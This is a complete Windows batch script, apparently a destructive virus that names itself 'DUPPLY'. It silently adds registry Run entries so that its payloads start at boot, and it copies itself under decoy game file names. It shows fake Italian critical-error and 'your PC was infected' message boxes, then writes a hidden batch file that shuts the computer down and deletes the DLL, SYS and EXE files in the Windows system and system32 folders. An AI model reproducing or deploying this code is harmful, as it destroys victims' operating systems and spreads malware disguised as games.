   @echo off
   color 4b
   mkdir C:\windows1
   echo REGEDIT4 >> C:\windows1\key1.reg
   echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >> C:\windows1\key1.reg
   echo "@@@"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "<<<"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "^^^"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "***"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "///"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "$$$"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "£££"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "start"="C:\\windows\\CRITICALMS.vbs" >> C:\windows1\key1.reg
   echo "on"="C:\\windows\\CRITICALMS.vbs" >> C:\windows1\key1.reg
   echo Windows Registry Editor Version 5.00 >> C:\windows1\key1.reg
   echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >> C:\windows1\key1.reg
   echo "@@@"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "<<<"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "^^^"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "***"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "///"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "$$$"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "£££"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
   echo "start"="C:\\windows\\CRITICALMS.vbs" >> C:\windows1\key1.reg
   echo "on"="C:\\windows\\CRITICALMS.vbs" >> C:\windows1\key1.reg
   start  regedit.exe /s C:\windows1\key1.reg
   copy %0 C:\player%random%.bat
   cls
   copy %0 C:\fifa2004.bat
   cls
   copy %0 C:\ageofwonders.bat
   cls
   copy %0 C:\masterchess.bat
   cls
   copy %0 C:\windows\longhorn.dat
   cls
   @echo off
   echo msgbox "SI E VERIFICATO UN ERRORE DI ARRESTO CRITICO CHIUDERE L'APPLICAZIONE",vbcritical >> C:\windows1\MSGS.vbs
   echo msgbox "HAAAAAAA YOUR PC WAS INFECTED BY VIRUS DUPPLY",vbcritical >> C:\windows\CRITICALMS.vbs
   start C:\windows1\MSGS.vbs
   echo cls >> C:\windows\EXPLORERR.bat
   echo shutdown.exe -s >> C:\windows\EXPLORERR.bat
   echo color 4b >> C:\windows\EXPLORERR.bat
   echo @echo off >> C:\windows\EXPLORERR.bat
   echo cd c:\windows\system\ >> C:\windows\EXPLORERR.bat
   echo cls >> C:\windows\EXPLORERR.bat
   echo del *.dll >> C:\windows\EXPLORERR.bat
   echo cls >> C:\windows\EXPLORERR.bat
   echo del *.sys >> C:\windows\EXPLORERR.bat
   echo cls >> C:\windows\EXPLORERR.bat
   echo del *.exe >> C:\windows\EXPLORERR.bat
   echo cls >> C:\windows\EXPLORERR.bat
   echo cd c:\windows\system32\ >> C:\windows\EXPLORERR.bat
   echo cls >> C:\windows\EXPLORERR.bat
   echo del *.dll >> C:\windows\EXPLORERR.bat
   echo cls >> C:\windows\EXPLORERR.bat
   echo del *.sys >> C:\windows\EXPLORERR.bat
   echo cls >> C:\windows\EXPLORERR.bat
   echo del *.exe >> C:\windows\EXPLORERR.bat
   echo cls >> C:\windows\EXPLORERR.bat
   attrib C:\windows\EXPLORERR.bat +S +H
   del C:\windows1\key1.reg
   cls
